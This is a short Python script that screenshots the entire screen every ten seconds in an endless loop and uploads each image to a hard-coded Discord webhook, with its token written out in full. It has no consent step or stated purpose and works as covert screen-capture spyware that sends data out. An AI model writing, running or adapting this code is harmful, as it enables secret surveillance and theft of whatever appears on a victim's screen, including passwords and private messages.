import requests
from PIL import ImageGrab
import io
import time

webhook_url = "https://discord.com/api/webhooks/1288519168945295371/CgFNgsihkgtJll7S6awaCTJ_98pOr4Lf98CRBlErpTUi2XMLUcFUqJU0LoCIUHsO5vni"

while True:
    img_byte_arr = io.BytesIO()
    ImageGrab.grab().save(img_byte_arr, format='PNG')
    img_byte_arr.seek(0)
    requests.post(webhook_url, files={"file": ("screenshot.png", img_byte_arr, "image/png")})
    time.sleep(10)
